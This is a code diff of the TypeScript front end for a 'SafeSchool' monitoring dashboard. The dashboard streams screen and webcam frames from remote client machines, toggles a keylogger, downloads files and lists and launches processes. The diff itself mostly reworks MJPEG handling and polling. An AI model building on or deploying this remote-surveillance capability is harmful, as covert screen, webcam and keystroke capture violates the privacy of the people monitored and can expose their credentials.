@@ -82,7 +82,7 @@ const elProcessListBody = document.getElementById("process-list-body")!;
 const chkSelectAll = document.getElementById("chk-select-all-procs") as HTMLInputElement;
 
 // --- Config ---
-const WS_URL = "ws://localhost:8881"; // Gateway on Windows Docker
+const WS_URL = "ws://192.168.1.64:8888";
 
 // --- Initialization ---
 console.log("🚀 SafeSchool Dashboard Initializing...");
@@ -94,7 +94,7 @@ initEvents();
 // --- WebSocket ---
 function initWebSocket() {
     wsClient = new GatewayWsClient({
-        onLog: (msg) => console.log("[WS]", msg),
+        onLog: (_msg) => { /* disabled for performance */ },
         onStatus: (s) => {
             statusConnection.textContent = `● ${s}`;
             statusConnection.style.color = s === "CONNECTED" ? "var(--neon-green)" : "var(--destructive)";
@@ -115,20 +115,61 @@ function initWebSocket() {
             if (!c) return;
 
             // Handle Video & Binary - ALWAYS feed to client's own JMuxer (background decoding)
+            // Handle Video & Binary - ALWAYS feed to client's own JMuxer (background decoding)
             if (ev.kind === "binary") {
                 if (!ev.payload || ev.payload.byteLength === 0) return;
 
                 const view = new DataView(ev.payload);
                 const type = view.getUint8(0);
 
-                if (type === 0x01) { // Screen
-                    // Feed to THIS CLIENT's JMuxer (continues even when hidden)
-                    if (c.state.monitor !== "idle" && c.jmuxerScreen) {
-                       c.jmuxerScreen.feed({ video: new Uint8Array(ev.payload.slice(1)) });
+                if (type === 0x01) { // Screen (MJPEG)
+                    if (c.state.monitor !== "idle") {
+                        const clientVideo = document.getElementById(`monitor-video-${ev.backendId}`) as HTMLVideoElement;
+                        // Only process if hidden client video exists (prevent leak)
+                        if (clientVideo) {
+                            const jpegData = ev.payload.slice(1); // Skip channel byte
+                            const blob = new Blob([jpegData], { type: "image/jpeg" });
+                            const url = URL.createObjectURL(blob);
+
+                            // Revoke old poster
+                            if (clientVideo.poster && clientVideo.poster.startsWith("blob:")) {
+                                URL.revokeObjectURL(clientVideo.poster);
+                            }
+                            clientVideo.poster = url;
+
+                            // If active, sync to main video
+                            if (activeClientId === ev.backendId) {
+                                const mainVideo = document.getElementById("monitor-video") as HTMLVideoElement;
+                                if (mainVideo) {
+                                     // NOTE: Main video shares same URL, no double-revoke needed on URL itself,
+                                     // but we should clear the mainVideo's *reference* to the OLD url if it differed.
+                                     // Actually, since mainVideo updates every frame, it just points to the new URL.
+                                     // The revocation happens on the next frame via clientVideo check above.
+                                     mainVideo.poster = url;
+                                }
+                            }
+                        }
                     }
-                } else if (type === 0x02) { // Webcam
-                    if (c.state.webcam !== "idle" && c.jmuxerWebcam) {
-                       c.jmuxerWebcam.feed({ video: new Uint8Array(ev.payload.slice(1)) });
+                } else if (type === 0x02) { // Webcam (MJPEG)
+                    if (c.state.webcam !== "idle") {
+                        const clientVideo = document.getElementById(`webcam-video-${ev.backendId}`) as HTMLVideoElement;
+                        if (clientVideo) {
+                            const jpegData = ev.payload.slice(1);
+                            const blob = new Blob([jpegData], { type: "image/jpeg" });
+                            const url = URL.createObjectURL(blob);
+
+                            if (clientVideo.poster && clientVideo.poster.startsWith("blob:")) {
+                                URL.revokeObjectURL(clientVideo.poster);
+                            }
+                            clientVideo.poster = url;
+
+                            if (activeClientId === ev.backendId) {
+                                const mainVideo = document.getElementById("webcam-video") as HTMLVideoElement;
+                                if (mainVideo) {
+                                    mainVideo.poster = url;
+                                }
+                            }
+                        }
                     }
                 } else if (type === 0x03) {
                     // File Download: [0x03][4B len][Name][Bytes]
@@ -149,8 +190,35 @@ function initWebSocket() {
                     console.log("📥 Downloaded:", fileName);
                 }
             } else if (ev.kind === "jpeg") {
-                // Fallback for MJPEG if needed
-                console.warn("Received JPEG, but expecting H.264");
+                // MJPEG Frame: [Channel 0x01/0x02][JPEG data]
+                if (ev.payload && ev.payload.byteLength > 1) {
+                    const view = new DataView(ev.payload);
+                    const channel = view.getUint8(0); // 0x01 = Screen, 0x02 = Webcam
+
+                    // Select correct video element based on channel
+                    const elementId = channel === 0x01 ? `monitor-video-${ev.backendId}` : `webcam-video-${ev.backendId}`;
+                    const clientVideo = document.getElementById(elementId) as HTMLVideoElement | null;
+
+                    const stateCheck = channel === 0x01 ? c.state.monitor !== "idle" : c.state.webcam !== "idle";
+
+                    if (stateCheck && clientVideo) {
+                        const jpegData = ev.payload.slice(1);
+                        const blob = new Blob([jpegData], { type: "image/jpeg" });
+                        const url = URL.createObjectURL(blob);
+
+                        if (clientVideo.poster && clientVideo.poster.startsWith("blob:")) {
+                            URL.revokeObjectURL(clientVideo.poster);
+                        }
+                        clientVideo.poster = url;
+
+                        // Sync Main Video if active
+                        if (activeClientId === ev.backendId) {
+                            const mainId = channel === 0x01 ? "monitor-video" : "webcam-video";
+                            const mainVideo = document.getElementById(mainId) as HTMLVideoElement | null;
+                             if (mainVideo) mainVideo.poster = url;
+                        }
+                    }
+                }
             }
 
             // Handle Text Responses (ALWAYS process, even if background)
@@ -255,8 +323,9 @@ function addOrUpdateClient(id: number, status: "online" | "offline") {
 
 function renderClientList() {
     elClientList.innerHTML = "";
+    // console.log("Rendering Client List. Size:", clients.size);
     if (clients.size === 0) {
-        elClientList.innerHTML = `<div class="p-4 text-muted text-sm">Scanning...</div>`;
+        elClientList.innerHTML = `<div class="p-4 text-muted text-sm">Scanning... (Empty List)</div>`;
         return;
     }
 
@@ -386,10 +455,13 @@ function setActiveClient(id: number | null) {
     wsClient.sendText(id, "list_apps");
     processAutoRefreshInterval = setInterval(() => {
         if (activeClientId === id) {
-            wsClient.sendText(id, "list_process");
-            wsClient.sendText(id, "list_apps");
+             // Only poll if tab is active
+            if(document.visibilityState === 'visible') {
+                 wsClient.sendText(id, "list_process");
+                 wsClient.sendText(id, "list_apps");
+            }
         }
-    }, 5000);
+    }, 15000);
 }
 
 function updateUIForClientState(c: Client) {
@@ -520,6 +592,9 @@ function handleBackendText(id: number, text: string) {
     if (text.startsWith("STATUS:")) {
         const [_, feature, state] = text.split(":");
 
+        // DIAGNOSTIC: Log ALL STATUS messages with timestamp (DISABLED FOR PERF)
+        // console.log(`[FE-STATUS-RECV] ${feature}:${state} at ${Date.now()}`);
+
         if (feature === "MONITOR_STREAM") {
             if (state === "STARTING") c.state.monitor = "starting";
             else if (state === "STARTED") c.state.monitor = "active";
@@ -647,9 +722,11 @@ function handleBackendText(id: number, text: string) {
     }
     else if (text.startsWith("INFO:NAME=")) { // Fixed space
         const name = text.substring(10).trim();
-        c.name = name;
-        renderClientList();
-        if (activeClientId === id) elHeaderClientName.textContent = name;
+        if (c.name !== name) {
+            c.name = name;
+            renderClientList();
+            if (activeClientId === id) elHeaderClientName.textContent = name;
+        }
     }
     else if (text.startsWith("ERROR:")) {
         if (activeClientId === id) alert("❌ " + text);
@@ -765,6 +842,7 @@ const handleStreamToggle = (type: 'monitor' | 'webcam' | 'keylogger') => {
         } else if (c.state.keylogger === 'active') {
             c.state.keylogger = 'stopping';
              updateUIForClientState(c);
+            console.log(`[FE] Sending stop_keylog at ${Date.now()}`);
             wsClient.sendText(activeClientId, "stop_keylog");
         }
     }
@@ -1041,7 +1119,8 @@ function initEvents() {
         }, 300);
     });
 
-    // Auto-Refresh Apps Loop (every 5 seconds)
+    // Auto-Refresh Apps Loop (REMOVED: Duplicate of per-client loop)
+    /*
     setInterval(() => {
         if(activeClientId) {
              const query = inpSearchApps.value.trim();
@@ -1049,6 +1128,7 @@ function initEvents() {
              else wsClient.sendText(activeClientId, "list_apps");
         }
     }, 5000);
+    */
 
     // Bulk App Actions
     const chkSelectAllApps = document.getElementById("chk-select-all-apps") as HTMLInputElement;
@@ -1076,7 +1156,7 @@ function initEvents() {
                 const app = currentAppList.find(a => a.id === appId);
                 // Smart Launch: Only if STOPPED
                 if(app && getAppPids(app).length === 0) {
-                    wsClient.sendText(activeClientId!, `start_app ${app.id}`);
+                    wsClient.sendText(activeClientId!, `start_app ${app.exec}`);
                     count++;
                 }
             });
@@ -1120,9 +1200,12 @@ function getAppPids(app: AppInfo): string[] {
     const client = clients.get(activeClientId);
     if (!client) return [];
 
-    // extract binary name from start cmd
-    let binName = app.exec.split(' ')[0].split('/').pop()?.toLowerCase();
+    // extract binary name from start cmd (Handle Windows Backslash)
+    let binName = app.exec.split(/[\\/]/).pop()?.split(' ')[0]?.toLowerCase();
     if (!binName) return [];
+    // Remove .exe extension for broader matching if needed, but usually p.name has it.
+    // Console log for debugging
+    // console.log(`Checking app ${app.name} (${binName}) against ${client.processes.length} procs`);
 
     return client.processes
         .filter((p: Process) => {
@@ -1203,7 +1286,9 @@ function renderApplications(apps: AppInfo[]) {
             btnLaunch.innerHTML = "🚀 Launch";
             btnLaunch.onclick = (e) => {
                  e.stopPropagation();
-                 wsClient.sendText(activeClientId!, `start_app ${app.id}`);
+                 // USE EXEC PATH, NOT ID/NAME (Fixes "File not found" errors)
+                 // Wrap in quotes to handle spaces correctly
+                 wsClient.sendText(activeClientId!, `launch_app "${app.exec}"`);
             };
             tdAction.appendChild(btnLaunch);
         }
